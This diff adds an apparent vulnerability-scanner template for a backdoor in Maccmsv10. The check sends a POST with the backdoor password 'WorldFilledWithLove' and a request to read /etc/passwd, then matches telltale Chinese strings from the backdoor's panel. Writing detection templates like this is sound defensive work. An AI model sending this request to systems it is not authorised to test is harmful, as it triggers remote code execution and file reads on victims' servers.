@@ -1,0 +1,30 @@
+id: maccmsv10-backdoor
+brief:
+    title: Maccmsv10 - Backdoor Remote Code Execution
+    by: princechaddha
+    level: critical
+    about: Maccmsv10 contains a backdoor which can be exploited by remote attackers. The backdoor is accessible via the '/index.php/bbs/index/download' endpoint and the special 'getpwd' parameter value of 'Wo...
+    label:
+        - maccmsv10
+        - rce
+        - backdoor
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: getpwd=WorldFilledWithLove
+      signs:
+        - "on": word
+          has:
+            - 扫描后门
+            - 反弹端口
+            - 文件管理
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
